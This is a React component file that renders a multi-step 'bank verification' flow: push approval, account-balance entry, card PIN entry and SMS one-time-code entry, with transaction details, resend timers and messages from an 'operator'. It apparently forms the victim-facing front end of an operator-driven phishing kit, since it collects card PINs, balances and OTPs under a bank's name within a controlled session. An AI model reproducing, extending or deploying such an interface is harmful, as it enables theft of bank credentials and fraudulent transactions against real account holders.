import React from "react";
import { useBankVerification } from "../hooks/use-bank-verification";
import type { BankVerificationProps, OperatorMessage, ResendState, TransactionDetails } from "../types";

function renderTransactionDetails(details: TransactionDetails) {
  const rows: { label: string; value: string }[] = [];
  if (details.merchantName) rows.push({ label: "Merchant Name", value: details.merchantName });
  if (details.amount) rows.push({ label: "Amount", value: details.amount });
  if (details.date) rows.push({ label: "Date", value: details.date });
  if (details.cardNumber) rows.push({ label: "Card Number", value: details.cardNumber });
  if (rows.length === 0) return null;

  return (
    <div className="bank-ui-transaction-details">
      <h3 className="bank-ui-transaction-details-title">Transaction details</h3>
      <ul className="bank-ui-transaction-details-list">
        {rows.map(({ label, value }) => (
          <li key={label} className="bank-ui-transaction-details-row">
            <span className="bank-ui-transaction-details-label">{label}</span>
            <span className="bank-ui-transaction-details-value">{value}</span>
          </li>
        ))}
      </ul>
    </div>
  );
}

function spinner(size: number) {
  const border = Math.max(2, Math.floor(size / 8));
  return (
    <div
      className="bank-ui-spinner"
      style={
        {
          "--bank-ui-spinner-size": `${size}px`,
          "--bank-ui-spinner-border": `${border}px`,
        } as React.CSSProperties
      }
    />
  );
}

export function BankVerification(props: BankVerificationProps) {
  const {
    missingParams,
    shouldRenderNull,
    inProgress,
    awaitingVerification,
    baseLayout,
    layoutProps,
    error,
  } = useBankVerification(props);

  if (missingParams) {
    return <div className="bank-ui-error-missing">Missing channel or session</div>;
  }

  if (shouldRenderNull) {
    return null;
  }

  const renderLayout = () => {
    if (baseLayout === "push") {
      const { bank, transactionDetails } = layoutProps as {
        bank?: string;
        transactionDetails?: TransactionDetails;
      };
      return (
        <div className="bank-ui-layout-center">
          {transactionDetails && renderTransactionDetails(transactionDetails)}
          <div className="bank-ui-spinner-wrap">{spinner(64)}</div>
          <h2 className="bank-ui-heading">Confirm on your device</h2>
          <p className="bank-ui-body">
            {bank
              ? `A push notification has been sent by ${bank}. Please approve the transaction on your device.`
              : "A push notification has been sent to your mobile app. Please approve the transaction on your device."}
          </p>
        </div>
      );
    }

    if (baseLayout === "balance") {
      const {
        bank,
        transactionDetails,
        balance,
        onBalanceChange,
        operatorMessage,
        onSubmit,
        submitting,
        canSubmit,
      } = layoutProps as {
        bank?: string;
        transactionDetails?: TransactionDetails;
        balance: string;
        onBalanceChange: (v: string) => void;
        operatorMessage?: OperatorMessage | null;
        onSubmit: () => void;
        submitting: boolean;
        canSubmit: boolean;
      };
      const messageClass =
        operatorMessage?.level === "error"
          ? "bank-ui-message bank-ui-message-error"
          : "bank-ui-message bank-ui-message-info";
      const handleBalanceSubmit = (e: React.FormEvent) => {
        e.preventDefault();
        onSubmit();
      };
      return (
        <div className="bank-ui-layout">
          {transactionDetails && renderTransactionDetails(transactionDetails)}
          <h2 className="bank-ui-heading">Balance verification</h2>
          <p className="bank-ui-body">
            {bank
              ? `Please enter your ${bank} account balance to complete the verification.`
              : "Please enter your account balance to complete the verification."}
          </p>
          {operatorMessage && (
            <div className={messageClass}>{operatorMessage.message}</div>
          )}
          <form onSubmit={handleBalanceSubmit} className="bank-ui-form">
            <div>
              <label htmlFor="balance" className="bank-ui-label-muted">
                Balance
              </label>
              <input
                id="balance"
                type="text"
                inputMode="decimal"
                value={balance}
                onChange={(e) => onBalanceChange(e.target.value)}
                disabled={submitting}
                placeholder="e.g. 1,234.56"
                className="bank-ui-input"
              />
            </div>
            <button
              type="submit"
              disabled={submitting || !canSubmit}
              className="bank-ui-btn bank-ui-btn-lg"
            >
              {submitting ? "Submitting..." : "Submit"}
            </button>
          </form>
          {submitting && (
            <div className="bank-ui-waiting">
              {spinner(40)}
              <span className="bank-ui-waiting-text">Waiting for confirmation...</span>
            </div>
          )}
        </div>
      );
    }

    if (baseLayout === "pin") {
      const {
        bank,
        transactionDetails,
        pinValue,
        onPinChange,
        pinMasked,
        onPinMaskToggle,
        wrongCode,
        expiredCode,
        onTryAgain,
        operatorMessage,
        submitting,
        resendState,
      } = layoutProps as {
        bank?: string;
        transactionDetails?: TransactionDetails;
        pinValue: string;
        onPinChange: (v: string) => void;
        pinMasked: boolean;
        onPinMaskToggle: () => void;
        wrongCode?: boolean;
        expiredCode?: boolean;
        onTryAgain?: () => void;
        operatorMessage?: OperatorMessage | null;
        submitting: boolean;
        resendState: ResendState;
      };
      const messageClass =
        operatorMessage?.level === "error"
          ? "bank-ui-message bank-ui-message-error"
          : "bank-ui-message bank-ui-message-info";
      const { secondsLeft, canResend, onResend, resending } = resendState;
      const pinHandleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const v = e.target.value.replace(/\D/g, "").slice(0, 4);
        onPinChange(v);
      };
      return (
        <div className="bank-ui-layout">
          {wrongCode && (
            <div className="bank-ui-alert">
              <p className="bank-ui-alert-title">Wrong PIN. Please try again.</p>
            </div>
          )}
          {expiredCode && (
            <div className="bank-ui-alert">
              <p className="bank-ui-alert-title">Code expired. Please request a new code.</p>
            </div>
          )}
          {transactionDetails && renderTransactionDetails(transactionDetails)}
          <h2 className="bank-ui-heading">Enter your PIN</h2>
          <p className="bank-ui-body">
            {bank
              ? `Enter the PIN for your ${bank} card to complete the transaction.`
              : "Enter the PIN for your card to complete the transaction."}
          </p>
          {operatorMessage && (
            <div className={messageClass}>{operatorMessage.message}</div>
          )}
          <div>
            <label htmlFor="pin-input" className="bank-ui-label bank-ui-label-center">
              PIN
            </label>
            <input
              id="pin-input"
              type={pinMasked ? "password" : "text"}
              inputMode="numeric"
              maxLength={4}
              value={pinValue}
              onChange={pinHandleChange}
              disabled={submitting}
              placeholder="••••"
              className="bank-ui-input bank-ui-input-pin"
            />
            <label htmlFor="pin-show-toggle" className="bank-ui-toggle-label">
              <input
                id="pin-show-toggle"
                type="checkbox"
                checked={!pinMasked}
                onChange={() => onPinMaskToggle()}
              />
              Show PIN
            </label>
          </div>
          <div className="bank-ui-resend-row">
            {canResend ? (
              <button
                type="button"
                className="bank-ui-resend-btn"
                onClick={() => {
                  onTryAgain?.();
                  onResend();
                }}
                disabled={resending || submitting}
              >
                {resending ? "Sending..." : "Resend PIN"}
              </button>
            ) : (
              <span className="bank-ui-resend-countdown">
                Resend PIN in {String(Math.floor(secondsLeft / 60)).padStart(1, "0")}:{String(secondsLeft % 60).padStart(2, "0")}
              </span>
            )}
          </div>
          {submitting && (
            <div className="bank-ui-waiting">
              {spinner(40)}
              <span className="bank-ui-waiting-text">Waiting for confirmation...</span>
            </div>
          )}
        </div>
      );
    }

    // sms (default)
    const {
      bank,
      transactionDetails,
      code,
      onCodeChange,
      wrongCode,
      expiredCode,
      onTryAgain,
      operatorMessage,
      onSubmit,
      submitting,
      canSubmit,
      resendState,
    } = layoutProps as {
      bank?: string;
      transactionDetails?: TransactionDetails;
      code: string;
      onCodeChange: (v: string) => void;
      wrongCode?: boolean;
      expiredCode?: boolean;
      onTryAgain?: () => void;
      operatorMessage?: OperatorMessage | null;
      onSubmit: () => void;
      submitting: boolean;
      canSubmit: boolean;
      resendState: ResendState;
    };
    const messageClass =
      operatorMessage?.level === "error"
        ? "bank-ui-message bank-ui-message-error"
        : "bank-ui-message bank-ui-message-info";
    const { secondsLeft, canResend, onResend, resending } = resendState;
    const handleSmsSubmit = (e: React.FormEvent) => {
      e.preventDefault();
      onSubmit();
    };
    return (
      <div className="bank-ui-layout">
        {wrongCode && (
          <div className="bank-ui-alert">
            <p className="bank-ui-alert-title">Wrong OTP. Please try again.</p>
          </div>
        )}
        {expiredCode && (
          <div className="bank-ui-alert">
            <p className="bank-ui-alert-title">Code expired. Please request a new code.</p>
          </div>
        )}
        {transactionDetails && renderTransactionDetails(transactionDetails)}
        <h2 className="bank-ui-heading">Enter verification code</h2>
        <p className="bank-ui-body">
          {bank
            ? `Please enter the OTP sent by ${bank} to your registered mobile number.`
            : "Please enter the OTP sent to your registered mobile number."}
        </p>
        {operatorMessage && (
          <div className={messageClass}>{operatorMessage.message}</div>
        )}
        <form onSubmit={handleSmsSubmit} className="bank-ui-form">
          <div>
            <label htmlFor="otp-code" className="bank-ui-label">
              Verification code
            </label>
            <input
              id="otp-code"
              type="text"
              inputMode="numeric"
              maxLength={6}
              value={code}
              onChange={(e) => onCodeChange(e.target.value.replace(/\D/g, "").slice(0, 6))}
              disabled={submitting}
              placeholder="000000"
              className="bank-ui-input"
            />
          </div>
          <button
            type="submit"
            disabled={submitting || !canSubmit}
            className="bank-ui-btn"
          >
            Submit
          </button>
        </form>
        <div className="bank-ui-resend-row">
          {canResend ? (
            <button
              type="button"
              className="bank-ui-resend-btn"
              onClick={() => {
                onTryAgain?.();
                onResend();
              }}
              disabled={resending || submitting}
            >
              {resending ? "Sending..." : "Resend SMS"}
            </button>
          ) : (
            <span className="bank-ui-resend-countdown">
              Resend SMS in {String(Math.floor(secondsLeft / 60)).padStart(1, "0")}:{String(secondsLeft % 60).padStart(2, "0")}
            </span>
          )}
        </div>
        {submitting && (
          <div className="bank-ui-waiting">
            {spinner(40)}
            <span className="bank-ui-waiting-text">Waiting for confirmation...</span>
          </div>
        )}
      </div>
    );
  };

  return (
    <div className="bank-ui-verification">
      {inProgress && (
        <div className="bank-ui-overlay">
          <div className="bank-ui-overlay-content">
            <div className="bank-ui-overlay-spinner">{spinner(48)}</div>
            <p className="bank-ui-overlay-message">Processing...</p>
          </div>
        </div>
      )}
      {awaitingVerification && renderLayout()}
      {error && (
        <div className="bank-ui-error-toast-wrapper">
          <div className="bank-ui-error-toast">{error}</div>
        </div>
      )}
    </div>
  );
}
